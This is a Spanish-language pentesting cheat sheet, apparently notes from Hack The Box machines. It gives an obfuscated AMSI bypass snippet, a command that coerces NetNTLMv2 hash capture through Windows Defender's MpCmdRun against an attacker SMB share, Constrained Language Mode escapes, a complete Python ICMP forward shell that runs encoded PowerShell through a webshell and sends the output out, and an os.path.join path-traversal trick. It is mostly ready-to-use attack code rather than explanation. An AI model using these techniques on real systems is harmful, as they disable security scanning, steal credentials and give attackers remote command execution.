# Bypassing

## AMSI

### Automatización de WinRM

```null
*Evil-WinRM* PS C:\Users\melanie\Desktop> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!
```

### Corromper tarea (Condición de carrera)

```null
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

## Obtención de hash NetNTLMv2 con Windows Defender

```null
*Evil-WinRM* PS C:\Program Files\Windows Defender> ./MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.16.6\test
```

## CLM

### Detección

```null
[10.10.10.210]: PS> $ExecutionContext.SessionState.LanguageMode                                                       
ConstrainedLanguage
```

### PSSessions

```null
PS /home/rubbx/Desktop/HTB/Machines/Reel2> Enter-PSSession -ComputerName 10.10.10.210 -Credential $Cred -Authentication Negotiate
```

### Ejecución de comandos con funciones

```null
[10.10.10.210]: PS> function bypassCLM { whoami }
[10.10.10.210]: PS>bypassCLM
htb\k.svensson
```

## ICMP Forward Shell

```python
#!/usr/bin/env python3

import base64
import requests
import threading
from cmd import Cmd
from scapy.all import *
from urllib.parse import quote


class Term(Cmd):

    prompt = "[~] - "
    cmd_payload = """$cmd = '{cmd}'; $step=1000; $ping = New-Object System.Net.NetworkInformation.Ping; $opts = New-Object System.Net.NetworkInformation.PingOptions; $opts.DontFragment = $true; $res=(iex -command $cmd|out-string); $data = [System.Text.Encoding]::ASCII.GetBytes($res); $i=0; while($i -lt $data.length)"""


    def __init__(self):
        super().__init__()
        thread = threading.Thread(target=self.listen_thread, args=())
        thread.daemon = True
        thread.start()


    def listen_thread(self):
        sniff(filter="icmp and src 10.10.10.57", iface="tun0", prn=self.handle_icmp)


    def handle_icmp(self, pkt):
        print(pkt[Raw].load.decode(), end="")
        sys.stdout.flush()


    def default(self, args):
        cmd = self.cmd_payload.format(cmd=args)
        enccmd = quote(quote(base64.b64encode(cmd.encode('utf-16le')).decode()))
        requests.get(f'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=powershell+-enc+{enccmd}')


term = Term()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()
```

## Python

Es posible eliminar la ruta que se obtiene de la ruta actual con ```getcwd()``` pasándole como argumento un path pero con una barra al principio

```null
python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.path.join(os.getcwd(), "public", "uploads", "test")
'/home/rubbx/Desktop/HTB/Machines/OpenSource/source/app/app/public/uploads/test'
```

En este ejemplo con la cadena ```/test```

```null
>>> os.path.join(os.getcwd(), "public", "uploads", "/test")
'/test'
```

